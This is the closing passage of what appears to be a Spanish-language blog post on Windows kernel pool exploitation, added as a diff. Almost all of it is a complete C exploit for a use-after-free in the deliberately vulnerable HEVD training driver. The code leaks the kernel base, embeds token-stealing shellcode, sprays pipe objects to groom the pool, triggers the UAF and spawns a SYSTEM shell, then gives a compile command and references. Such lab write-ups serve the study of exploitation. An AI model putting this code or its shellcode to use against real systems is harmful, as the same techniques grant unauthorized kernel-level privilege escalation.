+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] EnumDeviceDrivers: %d&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (lpImageBase) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  pKernelBaseAddress <span style="color:#f92672">=</span> ((ULONG_PTR <span style="color:#f92672">*</span>)lpImageBase)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Kernel Base Address: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pKernelBaseAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> pKernelBaseAddress;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* CheckWin():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     Simple function to check if we&#39;re running as SYSTEM */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">CheckWin</span>(VOID)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  DWORD win <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  DWORD dwLen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  CHAR <span style="color:#f92672">*</span>cUsername <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(NULL, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (dwLen <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    cUsername <span style="color:#f92672">=</span> (CHAR <span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(dwLen <span style="color:#f92672">*</span> <span style="color:#66d9ef">sizeof</span>(CHAR));
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate buffer for username check</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">GetUserNameA</span>(cUsername, <span style="color:#f92672">&amp;</span>dwLen);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  win <span style="color:#f92672">=</span> <span style="color:#a6e22e">strcmp</span>(cUsername, <span style="color:#e6db74">&#34;SYSTEM&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">free</span>(cUsername);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (win <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">?</span> win : <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">/* Exploit():
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     NonPaged Pool UAF */</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">Exploit</span>(HANDLE hHEVD)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  PipeHandles defragPipeHandles[DEF_PIPES] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  PipeHandles seqPipeHandles[SEQ_PIPES]    <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i                                    <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int64_t</span> kernelBaseAddr                   <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetKernelBaseAddress</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cShellcode[<span style="color:#ae81ff">0x58</span>] <span style="color:#f92672">=</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// FUNCTION POINTER
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// NOP SLED
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// sickle -p windows/x64/kernel_token_stealer -f c -m pinpoint
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0xb8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// mov rcx, rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb2\x04</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// mov dl, 4
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0x448]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x2d\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// sub rax, 0x448
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x90\x40\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// cmp byte ptr [rax + 0x440], dl
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xeb</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// jne 0x1017
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x4b8]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\x91\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov qword ptr [rcx + 0x4b8], rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// KERNEL RECOVERY
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x31\xc0</span><span style="color:#e6db74">&#34;</span>                         <span style="color:#75715e">// xor rax, rax 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x83\xc4\x48</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// add rsp, 0x48 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc3</span><span style="color:#e6db74">&#34;</span>;                                <span style="color:#75715e">// ret 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/* I found this intresting, we must allocate DATA_ENTRY objects like so otherwise
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     we will fail to allocate any. We have to start with a low amount THEN allocate
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     the sequential DATA_ENTRY objects. Although this is just 80000 allocations, we
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">     CANNOT just use one loop to hold all 80000 allocations. We must space it out */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Spraying objects for pool defragmentation</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> DEF_PIPES; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    defragPipeHandles[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreatePipeObject</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SEQ_PIPES; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    seqPipeHandles[i] <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreatePipeObject</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Creating holes to store object</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> SEQ_PIPES; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (i <span style="color:#f92672">%</span> <span style="color:#ae81ff">2</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">CloseHandle</span>(seqPipeHandles[i].read);
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">CloseHandle</span>(seqPipeHandles[i].write);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating target structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SendIOCTL</span>(hHEVD, ALLOCATE_REAL_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Freeing target structure</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SendIOCTL</span>(hHEVD, FREE_OBJ, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Filling holes with custom objects</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)(cShellcode) <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span>)(kernelBaseAddr <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40176b</span>); <span style="color:#75715e">/* add al, 0x10 ; call rax [nt] */</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">30000</span>; i<span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">SendIOCTL</span>(hHEVD, ALLOCATE_FAKE_OBJ, cShellcode, <span style="color:#ae81ff">0x58</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering UAF</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">SendIOCTL</span>(hHEVD, CALL_FUNC_PTR, NULL, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">CheckWin</span>();
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
+</span></span><span style="display:flex;"><span>                      (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
+</span></span><span style="display:flex;"><span>                      <span style="color:#ae81ff">0x00</span>,
+</span></span><span style="display:flex;"><span>                      NULL,
+</span></span><span style="display:flex;"><span>                      OPEN_EXISTING,
+</span></span><span style="display:flex;"><span>                      FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>                      NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">Exploit</span>(hHEVD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Exploitation successful, enjoy your shell</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;cmd.exe&#34;</span>);
+</span></span><span style="display:flex;"><span>  } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Exploitation failed, run again</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Una vez compilado (<em>x86_64-w64-mingw32-gcc poc.c -o poc.exe</em>), conseguimos nuestro acceso :)</p>
+<p><img src="/0x03-Approaching-the-Modern-Windows-Kernel-Heap/w00tw00t.gif" alt="alt text"></p>
+<h1 id="recursos">Recursos</h1>
+<pre tabindex="0"><code>https://media.blackhat.com/bh-dc-11/Mandt/BlackHat_DC_2011_Mandt_kernelpool-wp.pdf
+https://vulndev.io/2022/07/14/windows-kernel-exploitation-hevd-x64-use-after-free/
+https://web.archive.org/web/20230602115237/https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/
+https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf
+https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-1/
+https://www.vergiliusproject.com/
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
